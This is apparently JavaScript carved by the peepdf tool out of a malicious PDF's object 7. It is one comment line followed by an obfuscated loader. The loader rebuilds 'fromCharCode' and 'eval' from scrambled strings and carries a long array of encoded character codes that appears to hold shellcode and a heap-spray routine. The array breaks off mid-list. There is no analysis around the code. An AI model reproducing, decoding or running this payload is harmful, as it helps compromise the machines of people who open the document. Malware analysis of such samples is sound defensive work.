// peepdf comment: Javascript code located in object 7 (version 0)

var fhjty = "";
fopry = '';
lzex = "lzex";
hlnpu = '';
ypkalz = '';
abrvx = "";
ijzfw = false;
var isvw = "isvw",
    birs = '',
    gjnqr = '',
    cfimq = 0,
    ahnv = String,
    ceknqx = ahnv['f7rFoYmIC7hIaYrIC7oYd7e7'.replace(/[7FxYI]/g, '')],
    belvx = String,
    aknq = belvx['eOvOarlO'.replace(/[Ozhxr]/g, '')],
    agjknw = "16",
    jopqs = "",
    cqst = [62, 64, 58, 156, 166, 164, 148, 170, 154, 165, 159, 86, 151, 159, 169, 149, 154, 170, 89, 175, 146, 168, 164, 166, 93, 86, 157, 155, 159, 95, 172, 67, 59, 63, 58, 173, 153, 159, 157, 155, 81, 94, 170, 151, 163, 169, 161, 100, 157, 155, 159, 157, 165, 158, 81, 96, 81, 104, 81, 114, 81, 162, 150, 164, 90, 177, 62, 64, 58, 63, 58, 175, 146, 168, 164, 166, 81, 97, 110, 86, 170, 151, 163, 169, 161, 113, 62, 64, 58, 63, 174, 67, 59, 63, 58, 175, 146, 168, 164, 166, 81, 115, 81, 175, 146, 168, 164, 166, 95, 169, 166, 152, 164, 170, 163, 159, 159, 157, 89, 102, 93, 86, 157, 155, 159, 101, 99, 95, 108, 67, 59, 63, 58, 168, 150, 170, 166, 168, 159, 86, 170, 151, 163, 169, 161, 113, 62, 64, 58, 179, 62, 64, 62, 64, 58, 156, 166, 164, 148, 170, 154, 165, 159, 86, 166, 170, 154, 162, 144, 166, 163, 159, 159, 170, 151, 94, 90, 177, 62, 64, 58, 63, 167, 151, 163, 86, 161, 151, 170, 162, 160, 151, 149, 86, 110, 86, 166, 164, 150, 169, 148, 151, 161, 155, 89, 88, 86, 171, 118, 120, 118, 111, 86, 171, 97, 102, 97, 103, 86, 171, 102, 108, 97, 102, 86, 171, 114, 103, 103, 106, 86, 171, 97, 102, 100, 102, 86, 171, 97, 102, 97, 102, 86, 171, 101, 102, 105, 120, 86, 171, 105, 120, 97, 121, 86, 171, 98, 121, 104, 102, 86, 171, 105, 120, 114, 122, 86, 171, 97, 110, 101, 102, 86, 171, 116, 105, 102, 123, 86, 171, 105, 120, 102, 107, 86, 171, 105, 120, 118, 121, 86, 171, 97, 110, 101, 107, 86, 171, 100, 105, 102, 104, 86, 171, 116, 103, 117, 104, 86, 171, 97, 105, 116, 104, 86, 171, 98, 102, 100, 104, 86, 171, 105, 102, 101, 102, 86, 171, 97, 102, 100, 110, 86, 171, 119, 107, 104, 107, 86, 171, 116, 104, 105, 120, 86, 171, 102, 122, 102, 119, 86, 171, 97, 106, 116, 104, 86, 171, 102, 107, 97, 102, 86, 171, 118, 121, 105, 120, 86, 171, 102, 103, 102, 103, 86, 171, 102, 108, 102, 105, 86, 171, 103, 102, 102, 109, 86, 171, 102, 122, 105, 120, 86, 171, 100, 105, 97, 110, 86, 171, 105, 120, 116, 102, 86, 171, 97, 121, 104, 107, 86, 171, 119, 123, 105, 120, 86, 171, 104, 108, 97, 105, 86, 171, 105, 120, 100, 121, 86, 171, 104, 110, 101, 123, 86, 171, 116, 124, 97, 105, 86, 171, 102, 103, 105, 120, 86, 171, 102, 104, 98, 121, 86, 171, 102, 103, 105, 120, 86, 171, 102, 104, 99, 106, 86, 171, 104, 103, 105, 120, 86, 171, 101, 123, 98, 106, 86, 171, 104, 107, 105, 111, 86, 171, 105, 120, 119, 121, 86, 171, 99, 102, 104, 103, 86, 171, 119, 109, 97, 105, 86, 171, 101, 119, 106, 111, 86, 171, 101, 104, 114, 122, 86, 171, 100, 120, 103, 102, 86, 171, 119, 121, 102, 107, 86, 171, 97, 106, 104, 107, 86, 171, 116, 102, 100, 105, 86, 171, 100, 109, 118, 120, 86, 171, 119, 124, 100, 105, 86, 171, 101, 107, 97, 105, 86, 171, 106, 109, 97, 121, 86, 171, 116, 124, 105, 120, 86, 171, 104, 107, 114, 123, 86, 171, 99, 120, 119, 122, 86, 171, 101, 124, 119, 111, 86, 171, 118, 110, 102, 103, 86, 171, 119, 124, 106, 106, 86, 171, 119, 124, 119, 124, 86, 171, 116, 105, 100, 120, 86, 171, 104, 106, 103, 103, 86, 171, 118, 120, 97, 104, 86, 171, 105, 120, 117, 111, 86, 171, 97, 121, 101, 107, 86, 171, 102, 123, 106, 104, 86, 171, 119, 104, 97, 105, 86, 171, 118, 102, 117, 103, 86, 171, 116, 108, 97, 105, 86, 171, 116, 111, 100, 105, 86, 171, 115, 109, 97, 124, 86, 171, 102, 124, 97, 110, 86, 171, 118, 103, 116, 103, 86, 171, 97, 105, 97, 104, 86, 171, 97, 105, 116, 119, 86, 171, 105, 120, 116, 124, 86, 171, 97, 105, 97, 103, 86, 171, 105, 111, 116, 104, 86, 171, 119, 110, 101, 107, 86, 171, 105, 120, 103, 103, 86, 171, 119, 110, 101, 107, 86, 171, 102, 123, 102, 124, 86, 171, 116, 111, 102, 120, 86, 171, 102, 107, 116, 105, 86, 171, 118, 121, 105, 120, 86, 171, 118, 110, 102, 103, 86, 171, 119, 124, 101, 111, 86, 171, 119, 124, 119, 124, 86, 171, 103, 110, 102, 102, 86, 171, 103, 102, 118, 110, 86, 171, 97, 106, 115, 124, 86, 171, 103, 121, 118, 110, 86, 171, 119, 124, 119, 124, 86, 171, 100, 105, 119, 124, 86, 171, 102, 104, 117, 104, 86, 171, 119, 124, 102, 104, 86, 171, 97, 110, 104, 107, 86, 171, 117, 102, 119, 124, 86, 171, 101, 107, 105, 111, 86, 171, 105, 120, 119, 121, 86, 171, 119, 121, 101, 107, 86, 171, 116, 105, 116, 111, 86, 171, 105, 120, 102, 107, 86, 171, 105, 105, 118, 121, 86, 171, 97, 121, 118, 121, 86, 171, 101, 107, 105, 122, 86, 171, 102, 102, 119, 106, 86, 171, 101, 107, 116, 108, 86, 171, 104, 107, 119, 106, 86, 171, 101, 107, 116, 108, 86, 171, 104, 104, 119, 107, 86, 171, 101, 107, 116, 108, 86, 171, 103, 121, 119, 108, 86, 171, 101, 107, 116, 108, 86, 171, 103, 122, 119, 109, 86, 171, 101, 107, 116, 108, 86, 171, 103, 124, 119, 110, 86, 171, 101, 107, 116, 108, 86, 171, 103, 123, 119, 111, 86, 171, 101, 107, 116, 108, 86, 171, 99, 123, 119, 119, 86, 171, 101, 107, 116, 108, 86, 171, 103, 106, 119, 120, 86, 171, 101, 107, 116, 108, 86, 171, 103, 121, 119, 121, 86, 171, 101, 107, 116, 108, 86, 171, 103, 121, 119, 122, 86, 171, 101, 107, 116, 108, 86, 171, 97, 102, 119, 123, 86, 171, 114, 102, 118, 110, 86, 171, 119, 124, 119, 124, 86, 171, 102, 102, 119, 124, 86, 171, 102, 122, 103, 110, 86, 171, 98, 103, 105, 119, 86, 171, 118, 110, 98, 108, 86, 171, 119, 124, 98, 107, 86, 171, 119, 124, 119, 124, 86, 171, 116, 106, 105, 105, 86, 171, 105, 107, 97, 121, 86, 171, 104, 106, 116, 102, 86, 171, 103, 119, 98, 107, 86, 171, 103, 119, 97, 102, 86, 171, 119, 124, 97, 102, 86, 171, 97, 121, 104, 107, 86, 171, 104, 107, 119, 124, 86, 171, 103, 119, 97, 110, 86, 171, 119, 124, 97, 102, 86, 171, 105, 107, 117, 102, 86, 171, 104, 107, 116, 102, 86, 171, 101, 102, 97, 105, 86, 171, 116, 105, 116, 111, 86, 171, 116, 102, 100, 105, 86, 171, 116, 105, 116, 111, 86, 171, 100, 105, 102, 109, 86, 171, 105, 120, 116, 102, 86, 171, 99, 106, 101, 121, 86, 171, 105, 120, 97, 121, 86, 171, 99, 106, 104, 121, 86, 171, 119, 121, 97, 110, 86, 171, 114, 119, 119, 105, 86, 171, 116, 105, 102, 124, 86, 171, 101, 121, 105, 120, 86, 171, 97, 106, 99, 106, 86, 171, 100, 111, 105, 102, 86, 171, 105, 120, 97, 102, 86, 171, 104, 106, 116, 103, 86, 171, 101, 102, 97, 108, 86, 171, 100, 110, 105, 102, 86, 171, 104, 107, 97, 102, 86, 171, 99, 120, 119, 119, 86, 171, 116, 105, 116, 103, 86, 171, 105, 120, 102, 107, 86, 171, 105, 105, 118, 121, 86, 171, 103, 106, 118, 121, 86, 171, 105, 122, 102, 105, 86, 171, 119, 102, 101, 107, 86, 171, 100, 105, 102, 109, 86, 171, 102, 102, 117, 120, 86, 171, 101, 107, 116, 108, 86, 171, 103, 120, 119, 102, 86, 171, 101, 107, 116, 108, 86, 171, 103, 107, 119, 103, 86, 171, 101, 107, 116, 108, 86, 171, 104, 104, 119, 104, 86, 171, 101, 107, 116, 108, 86, 171, 103, 123, 119, 105, 86, 171, 101, 107, 116, 108, 86, 171, 103, 107, 119, 106, 86, 171, 101, 107, 116, 108, 86, 171, 103, 121, 119, 107, 86, 171, 101, 107, 116, 108, 86, 171, 100, 105, 119, 108, 86, 171, 101, 107, 116, 108, 86, 171, 100, 104, 119, 109, 86, 171, 101, 107, 116, 108, 86, 171, 99, 123, 119, 110, 86, 171, 101, 107, 116, 108, 86, 171, 103, 106, 119, 111, 86, 171, 101, 107, 116, 108, 86, 171, 103, 121, 119, 119, 86, 171, 101, 107, 116, 108, 86, 171, 103, 121, 119, 120, 86, 171, 102, 122, 105, 110, 86, 171, 118, 110, 119, 121, 86, 171, 119, 124, 97, 120, 86, 171, 119, 124, 119, 124, 86, 171, 103, 110, 102, 102, 86, 171, 101, 105, 103, 110, 86, 171, 105, 123, 119, 111, 86, 171, 105, 102, 118, 110, 86, 171, 119, 124, 119, 123, 86, 171, 105, 120, 119, 124, 86, 171, 105, 122, 119, 110, 86, 171, 106, 121, 101, 107, 86, 171, 101, 106, 103, 119, 86, 171, 118, 110, 102, 102, 86, 171, 119, 124, 104, 123, 86, 171, 119, 124, 119, 124, 86, 171, 101, 107, 105, 122, 86, 171, 103, 119, 118, 102, 86, 171, 102, 102, 98, 102, 86, 171, 104, 105, 118, 110, 86, 171, 119, 124, 119, 124, 86, 171, 105, 105, 119, 124, 86, 171, 98, 121, 116, 106, 86, 171, 101, 107, 105, 122, 86, 171, 102, 102, 118, 102, 86, 171, 101, 107, 105, 122, 86, 171, 102, 102, 106, 121, 86, 171, 102, 105, 102, 105, 86, 171, 102, 105, 102, 105, 86, 171, 102, 105, 102, 105, 86, 171, 104, 107, 119, 124, 86, 171, 116, 109, 97, 110, 86, 171, 106, 121, 101, 107, 86, 171, 97, 102, 101, 106, 86, 171, 97, 102, 97, 102, 86, 171, 119, 124, 102, 105, 86, 171, 102, 124, 117, 109, 86, 171, 115, 108, 97, 124, 86, 171, 102, 120, 116, 102, 86, 171, 116, 105, 116, 111, 86, 171, 105, 120, 102, 107, 86, 171, 102, 103, 118, 121, 86, 171, 102, 105, 102, 103, 86, 171, 102, 109, 102, 108, 86, 171, 101, 104, 103, 119, 86, 171, 104, 104, 118, 110, 86, 171, 97, 102, 97, 102, 86, 171, 105, 120, 97, 102, 86, 171, 100, 105, 117, 110, 86, 171, 105, 107, 119, 108, 86, 171, 102, 111, 117, 120, 86, 171, 101, 107, 116, 109, 86, 171, 103, 103, 119, 110, 86, 171, 103, 107, 99, 123, 86, 171, 116, 109, 104, 110, 86, 171, 119, 121, 101, 107, 86, 171, 97, 102, 103, 107, 86, 171, 97, 102, 97, 102, 86, 171, 102, 108, 104, 123, 86, 171, 101, 107, 105, 122, 86, 171, 102, 102, 119, 110, 86, 171, 118, 110, 102, 108, 86, 171, 97, 102, 102, 103, 86, 171, 97, 102, 97, 102, 86, 171, 102, 102, 102, 111, 86, 171, 115, 103, 118, 110, 86, 171, 119, 124, 119, 123, 86, 171, 105, 107, 119, 124, 86, 171, 102, 111, 116, 102, 86, 171, 104, 106, 102, 111, 86, 171, 105, 122, 100, 111, 86, 171, 97, 103, 101, 108, 86, 171, 118, 110, 102, 102, 86, 171, 97, 102, 100, 120, 86, 171, 97, 102, 97, 102, 86, 171, 119, 110, 105, 120, 86, 171, 101, 107, 105, 122, 86, 171, 102, 102, 119, 110, 86, 171, 99, 103, 118, 110, 86, 171, 119, 124, 119, 124, 86, 171, 105, 107, 119, 124, 86, 171, 102, 111, 116, 102, 86, 171, 104, 106, 102, 111, 86, 171, 102, 109, 97, 121, 86, 171, 97, 103, 118, 110, 86, 171, 119, 124, 119, 124, 86, 171, 102, 111, 119, 124, 86, 171, 101, 106, 116, 108, 86, 171, 119, 124, 100, 110, 86, 171, 102, 102, 104, 105, 86, 171, 101, 107, 105, 122, 86, 171, 119, 123, 119, 110, 86, 171, 102, 110, 97, 102, 86, 171, 101, 107, 105, 122, 86, 171, 102, 102, 119, 110, 86, 171, 118, 110, 102, 109, 86, 171, 119, 123, 104, 106, 86, 171, 119, 124, 119, 124, 86, 171, 102, 111, 102, 111, 86, 171, 101, 108, 101, 108, 86, 171, 119, 105, 100, 120, 86, 171, 114, 119, 104, 121, 86, 171, 102, 123, 102, 124, 86, 171, 116, 111, 102, 120, 86, 171, 102, 107, 116, 105, 86, 171, 118, 121, 105, 120, 86, 171, 102, 105, 102, 103, 86, 171, 103, 102, 103, 108, 86, 171, 100, 104, 115, 103, 86, 171, 97, 102, 118, 110, 86, 171, 97, 102, 97, 102, 86, 171, 102, 110, 97, 102, 86, 171, 97, 110, 100, 110, 86, 171, 97, 105, 104, 106, 86, 171, 118, 120, 101, 102, 86, 171, 101, 102, 119, 111, 86, 171, 102, 122, 105, 120, 86, 171, 105, 102, 97, 110, 86, 171, 101, 104, 119, 120, 86, 171, 97, 110, 104, 107, 86, 171, 117, 120, 100, 105, 86, 171, 98, 110, 105, 119, 86, 171, 116, 105, 105, 120, 86, 171, 98, 109, 118, 120, 86, 171, 98, 110, 100, 110, 86, 171, 98, 103, 104, 108, 86, 171, 100, 105, 101, 102, 86, 171, 105, 106, 116, 111, 86, 171, 104, 106, 117, 120, 86, 171, 101, 102, 97, 121, 86, 171, 97, 110, 100, 110, 86, 171, 119, 120, 104, 107, 86, 171, 119, 123, 101, 102, 86, 171, 118, 120, 116, 120, 86, 171, 100, 105, 119, 104, 86, 171, 105, 111, 116, 102, 86, 171, 119, 121, 101, 107, 86, 171, 101, 107, 105, 120, 86, 171, 102, 120, 119, 121, 86, 171, 116, 105, 116, 111, 86, 171, 97, 104, 100, 104, 86, 171, 104, 106, 103, 110, 86, 171, 104, 102, 104, 106, 86, 171, 99, 124, 100, 119, 86, 171, 103, 124, 99, 124, 86, 171, 104, 107, 104, 111, 86, 171, 103, 121, 103, 123, 86, 171, 103, 123, 103, 103, 86, 171, 99, 123, 103, 106, 86, 171, 104, 104, 103, 124, 86, 171, 99, 124, 103, 109, 86, 171, 104, 104, 103, 108, 86, 171, 103, 109, 103, 103, 86, 171, 104, 105, 104, 107, 86, 171, 103, 108, 99, 124, 86, 171, 104, 109, 103, 121, 86, 171, 100, 104, 104, 110, 86, 171, 103, 107, 99, 123, 86, 171, 103, 107, 104, 110, 86, 171, 103, 110, 97, 102, 86, 171, 104, 106, 104, 106, 86, 171, 100, 119, 104, 102, 86, 171, 99, 124, 99, 124, 86, 171, 104, 111, 103, 124, 86, 171, 103, 123, 104, 107, 86, 171, 103, 103, 103, 121, 86, 171, 103, 106, 103, 123, 86, 171, 103, 124, 99, 123, 86, 171, 103, 109, 104, 104, 86, 171, 103, 108, 99, 124, 86, 171, 103, 103, 104, 104, 86, 171, 104, 107, 103, 109, 86, 171, 99, 124, 104, 105, 86, 171, 103, 121, 103, 105, 86, 171, 103, 105, 103, 111, 86, 171, 99, 123, 103, 120, 86, 171, 103, 110, 104, 102, 86, 171, 100, 124, 104, 102, 86, 171, 100, 122, 104, 104, 86, 171, 97, 102, 97, 102, 83, 95, 108, 67, 59, 63, 58, 172, 146, 168, 81, 164, 160, 166, 81, 115, 81, 171, 159, 155, 164, 153, 146, 166, 150, 94, 83, 91, 166, 102, 114, 102, 114, 91, 166, 102, 114, 102, 114, 91, 166, 102, 114, 102, 114, 91, 166, 102, 114, 102, 114, 88, 90, 67, 59, 63, 58, 172, 146, 168, 81, 158, 150, 151, 161, 152, 157, 165, 148, 161, 81, 115, 81, 164, 160, 166, 81, 97, 81, 166, 146, 175, 157, 165, 146, 154, 108, 67, 59, 63, 58, 172, 146, 168, 81, 152, 154, 157, 147, 162, 160, 153, 156, 86, 110, 86, 166, 164, 150, 169, 148, 151, 161, 155, 89, 88, 86, 171, 97, 119, 97, 119, 86, 171, 97, 119, 97, 119, 83, 95, 108, 67, 59, 63, 58, 172, 146, 168, 81, 158, 150, 151, 149, 155, 163, 169, 154, 176, 150, 86, 110, 86, 99, 102, 108, 67, 59, 63, 58, 172, 146, 168, 81, 169, 161, 168, 146, 175, 81, 115, 81, 158, 150, 151, 149, 155, 163, 169, 154, 176, 150, 86, 92, 86, 153, 155, 146, 166, 147, 162, 160, 153, 156, 100, 157, 155, 159, 157, 165, 158, 108, 67, 59, 63, 58, 173, 153, 159, 157, 155, 81, 94, 147, 159, 152, 152, 157, 165, 148, 161, 95, 162, 150, 164, 152, 170, 153, 86, 109, 86, 164, 166, 163, 151, 170, 95, 172, 67, 59, 63, 58, 63, 147, 159, 152, 152, 157, 165, 148, 161, 81, 97, 110, 86, 147, 159, 152, 152, 157, 165, 148, 161, 108, 67, 59, 63, 58, 179, 62, 64, 58, 63, 167, 151, 163, 86, 151, 159, 157, 162, 147, 162, 160, 153, 156, 86, 110, 86, 147, 159, 152, 152, 157, 165, 148, 161, 95, 169, 166, 152, 164, 170, 163, 159, 159, 157, 89, 102, 93, 86, 164, 166, 163, 151, 170, 95, 108, 67, 59, 63, 58, 172, 146, 168, 81, 152, 157, 165, 148, 161, 81, 115, 81, 152, 154, 157, 147, 162, 160, 153, 156, 100, 164, 171, 147, 169, 165, 168, 154, 164, 152, 94, 97, 98, 81, 152, 154, 157, 147, 162, 160, 153, 156, 100, 157, 155, 159, 157, 165, 158, 94, 169, 161, 168, 146, 175, 90, 113, 62, 64, 58, 63, 168, 158, 154, 162, 150, 86, 89, 152, 157, 165, 148, 161, 95, 162, 150, 164, 152, 170, 153, 97, 164, 166, 163, 151, 170, 86, 109, 86, 97, 174, 101, 102, 97, 102, 97, 95, 172, 67, 59, 63, 58, 63, 147, 162, 160, 153, 156, 86, 110, 86, 147, 162, 160, 153, 156, 86, 92, 86, 147, 162, 160, 153, 156, 86, 92, 86, 151, 159, 157, 162, 147, 162, 160, 153, 156, 113, 62, 64, 58, 63, 174, 67, 59, 63, 58, 172, 146, 168, 81, 163, 150, 163, 144, 151, 163, 168, 146, 175, 81, 115, 81, 164, 150, 173, 81, 119, 163, 168, 146, 175, 89, 95, 108, 67, 59, 63, 58, 156, 160, 168, 81, 94, 167, 151, 163, 86, 154, 86, 110, 86, 97, 113, 81, 159, 81, 114, 81, 103, 101, 102, 97, 113, 81, 159, 92, 97, 90, 177, 62, 64, 58, 63, 58, 163, 150, 163, 144, 151, 163, 168, 146, 175, 140, 159, 142, 86, 110, 86, 147, 162, 160, 153, 156, 86, 92, 86, 153, 155, 146, 166, 147, 162, 160, 153, 156, 113, 62, 64, 58, 63, 174, 67, 59, 63, 58, 172, 146, 168, 81, 164, 166, 163, 81, 115, 81, 103, 99, 111, 106, 111, 106, 111, 106, 111, 106, 111, 106, 111, 106, 111, 106, 111, 106, 111, 106, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 110, 105, 113, 62, 64, 58, 63, 166, 170, 154, 162, 95, 166, 163, 159, 159, 170, 151, 94, 83, 91, 101, 107, 97, 102, 97, 156, 83, 98, 81, 164, 166, 163, 90, 113, 62, 64, 58, 179, 62, 64, 62, 64, 58, 156, 166, 164, 148, 170, 154, 165, 159, 86, 148, 165, 157, 162, 146, 152, 144, 155, 158, 151, 154, 162, 89, 95, 172, 67, 59, 63, 58, 172, 146, 168, 81, 169, 153, 155, 157, 162, 148, 165, 149, 155, 81, 115, 81, 171, 159, 155, 164, 153, 146, 166, 150, 94, 83, 91, 166, 123, 115, 123, 106, 91, 166, 102, 97, 102, 98, 91, 166, 107, 103, 102, 97, 91, 166, 119, 98, 108, 101, 91, 166, 102, 97, 105, 97, 91, 166, 102, 97, 102, 97, 91, 166, 106, 97, 110, 115, 91, 166, 110, 115, 102, 116, 91, 166, 103, 116, 109, 97, 91, 166, 110, 115, 119, 117, 91, 166, 102, 105, 106, 97, 91, 166, 121, 100, 107, 118, 91, 166, 110, 115, 107, 102, 91, 166, 110, 115, 123, 116, 91, 166, 102, 105, 106, 102, 91, 166, 105, 100, 107, 99, 91, 166, 121, 98, 122, 99, 91, 166, 102, 100, 121, 99, 91, 166, 103, 97, 105, 99, 91, 166, 110, 97, 106, 97, 91, 166, 102, 97, 105, 105, 91, 166, 124, 102, 109, 102, 91, 166, 121, 99, 110, 115, 91, 166, 107, 117, 107, 114, 91, 166, 102, 101, 121, 99, 91, 166, 107, 102, 102, 97, 91, 166, 123, 116, 110, 115, 91, 166, 107, 98, 107, 98, 91, 166, 107, 103, 107, 100, 91, 166, 108, 97, 107, 104, 91, 166, 107, 117, 110, 115, 91, 166, 105, 100, 102, 105, 91, 166, 110, 115, 121, 97, 91, 166, 102, 116, 109, 102, 91, 166, 124, 118, 110, 115, 91, 166, 109, 103, 102, 100, 91, 166, 110, 115, 105, 116, 91, 166, 109, 105, 106, 118, 91, 166, 121, 119, 102, 100, 91, 166, 107, 98, 110, 115, 91, 166, 107, 99, 103, 116, 91, 166, 107, 98, 110, 115, 91, 166, 107, 99, 104, 101, 91, 166, 109, 98, 110, 115, 91, 166, 106, 118, 103, 101, 91, 166, 109, 102, 110, 106, 91, 166, 110, 115, 124, 116, 91, 166, 104, 97, 109, 98, 91, 166, 124, 104, 102, 100, 91, 166, 106, 114, 111, 106, 91, 166, 106, 99, 119, 117, 91, 166, 105, 115, 108, 97, 91, 166, 124, 116, 107, 102, 91, 166, 102, 101, 109, 102, 91, 166, 121, 97, 105, 100, 91, 166, 105, 104, 123, 115, 91, 166, 124, 119, 105, 100, 91, 166, 106, 102, 102, 100, 91, 166, 111, 104, 102, 116, 91, 166, 121, 119, 110, 115, 91, 166, 109, 102, 119, 118, 91, 166, 104, 115, 124, 117, 91, 166, 106, 119, 124, 106, 91, 166, 123, 105, 107, 98, 91, 166, 124, 119, 111, 101, 91, 166, 124, 119, 124, 119, 91, 166, 121, 100, 105, 115, 91, 166, 109, 101, 108, 98, 91, 166, 123, 115, 102, 99, 91, 166, 110, 115, 122, 106, 91, 166, 102, 116, 106, 102, 91, 166, 107, 118, 111, 99, 91, 166, 124, 99, 102, 100, 91, 166, 123, 97, 122, 98, 91, 166, 121, 103, 102, 100, 91, 166, 121, 106, 105, 100, 91, 166, 120, 104, 102, 119, 91, 166, 107, 119, 102, 105, 91, 166, 123, 98, 121, 98, 91, 166, 102, 100, 102, 99, 91, 166, 102, 100, 121, 114, 91, 166, 110, 115, 121, 119, 91, 166, 102, 100, 102, 98, 91, 166, 110, 106, 121, 99, 91, 166, 124, 105, 106, 102, 91, 166, 110, 115, 108, 98, 91, 166, 124, 105, 106, 102, 91, 166, 107, 118, 107, 119, 91, 166, 121, 106, 107, 115, 91, 166, 107, 102, 121, 100, 91, 166, 123, 116, 110, 115, 91, 166, 123, 105, 107, 98, 91, 166, 124, 119, 106, 106, 91, 166, 124, 119, 124, 119, 91, 166, 108, 105, 107, 97, 91, 166, 108, 97, 123, 105, 91, 166, 102, 101, 120, 119, 91, 166, 108, 116, 123, 105, 91, 166, 124, 119, 124, 119, 91, 166, 105, 100, 124, 119, 91, 166, 107, 99, 122, 99, 91, 166, 124, 119, 107, 99, 91, 166, 102, 105, 109, 102, 91, 166, 122, 97, 124, 119, 91, 166, 106, 102, 110, 106, 91, 166, 110, 115, 124, 116, 91, 166, 124, 116, 106, 102, 91, 166, 121, 100, 121, 106, 91, 166, 110, 115, 107, 102, 91, 166, 110, 100, 123, 116, 91, 166, 102, 116, 123, 116, 91, 166, 106, 102, 110, 117, 91, 166, 107, 97, 124, 101, 91, 166, 106, 102, 121, 103, 91, 166, 109, 102, 124, 101, 91, 166, 106, 102, 121, 103, 91, 166, 109, 99, 124, 102, 91, 166, 106, 102, 121, 103, 91, 166, 108, 116, 124, 103, 91, 166, 106, 102, 121, 103, 91, 166, 108, 117, 124, 104, 91, 166, 106, 102, 121, 103, 91, 166, 108, 119, 124, 105, 91, 166, 106, 102, 121, 103, 91, 166, 108, 118, 124, 106, 91, 166, 106, 102, 121, 103, 91, 166, 104, 118, 124, 114, 91, 166, 106, 102, 121, 103, 91, 166, 108, 101, 124, 115, 91, 166, 106, 102, 121, 103, 91, 166, 108, 116, 124, 116, 91, 166, 106, 102, 121, 103, 91, 166, 108, 116, 124, 117, 91, 166, 106, 102, 121, 103, 91, 166, 102, 97, 124, 118, 91, 166, 119, 97, 123, 105, 91, 166, 124, 119, 124, 119, 91, 166, 107, 97, 124, 119, 91, 166, 107, 117, 108, 105, 91, 166, 103, 98, 110, 114, 91, 166, 123, 105, 103, 103, 91, 166, 124, 119, 103, 102, 91, 166, 124, 119, 124, 119, 91, 166, 121, 101, 110, 100, 91, 166, 110, 102, 102, 116, 91, 166, 109, 101, 121, 97, 91, 166, 108, 114, 103, 102, 91, 166, 108, 114, 102, 97, 91, 166, 124, 119, 102, 97, 91, 166, 102, 116, 109, 102, 91, 166, 109, 102, 124, 119, 91, 166, 108, 114, 102, 105, 91, 166, 124, 119, 102, 97, 91, 166, 110, 102, 122, 97, 91, 166, 109, 102, 121, 97, 91, 166, 106, 97, 102, 100, 91, 166, 121, 100, 121, 106, 91, 166, 121, 97, 105, 100, 91, 166, 121, 100, 121, 106, 91, 166, 105, 100, 107, 104, 91, 166, 110, 115, 121, 97, 91, 166, 104, 101, 106, 116, 91, 166, 110, 115, 102, 116, 91, 166, 104, 101, 109, 116, 91, 166, 124, 116, 102, 105, 91, 166, 119, 114, 124, 100, 91, 166, 121, 100, 107, 119, 91, 166, 106, 116, 110, 115, 91, 166, 102, 101, 104, 101, 91, 166, 105, 106, 110, 97, 91, 166, 110, 115, 102, 97, 91, 166, 109, 101, 121, 98, 91, 166, 106, 97, 102, 103, 91, 166, 105, 105, 110, 97, 91, 166, 109, 102, 102, 97, 91, 166, 104, 115, 124, 114, 91, 166, 121, 100, 121, 98, 91, 166, 110, 115, 107, 102, 91, 166, 110, 100, 123, 116, 91, 166, 108, 101, 123, 116, 91, 166, 110, 117, 107, 100, 91, 166, 124, 97, 106, 102, 91, 166, 105, 100, 107, 104, 91, 166, 107, 97, 122, 115, 91, 166, 106, 102, 121, 103, 91, 166, 108, 115, 124, 97, 91, 166, 106, 102, 121, 103, 91, 166, 108, 102, 124, 98, 91, 166, 106, 102, 121, 103, 91, 166, 109, 99, 124, 99, 91, 166, 106, 102, 121, 103, 91, 166, 108, 118, 124, 100, 91, 166, 106, 102, 121, 103, 91, 166, 108, 102, 124, 101, 91, 166, 106, 102, 121, 103, 91, 166, 108, 116, 124, 102, 91, 166, 106, 102, 121, 103, 91, 166, 105, 100, 124, 103, 91, 166, 106, 102, 121, 103, 91, 166, 105, 99, 124, 104, 91, 166, 106, 102, 121, 103, 91, 166, 104, 118, 124, 105, 91, 166, 106, 102, 121, 103, 91, 166, 108, 101, 124, 106, 91, 166, 106, 102, 121, 103, 91, 166, 108, 116, 124, 114, 91, 166, 106, 102, 121, 103, 91, 166, 108, 116, 124, 115, 91, 166, 107, 117, 110, 105, 91, 166, 123, 105, 124, 116, 91, 166, 124, 119, 102, 115, 91, 166, 124, 119, 124, 119, 91, 166, 108, 105, 107, 97, 91, 166, 106, 100, 108, 105, 91, 166, 110, 118, 124, 106, 91, 166, 110, 97, 123, 105, 91, 166, 124, 119, 124, 118, 91, 166, 110, 115, 124, 119, 91, 166, 110, 117, 124, 105, 91, 166, 111, 116, 106, 102, 91, 166, 106, 101, 108, 114, 91, 166, 123, 105, 107, 97, 91, 166, 124, 119, 109, 118, 91, 166, 124, 119, 124, 119, 91, 166, 106, 102, 110, 117, 91, 166, 108, 114, 123, 97, 91, 166, 107, 97, 103, 97, 91, 166, 109, 100, 123, 105, 91, 166, 124, 119, 124, 119, 91, 166, 110, 100, 124, 119, 91, 166, 103, 116, 121, 101, 91, 166, 106, 102, 110, 117, 91, 166, 107, 97, 123, 97, 91, 166, 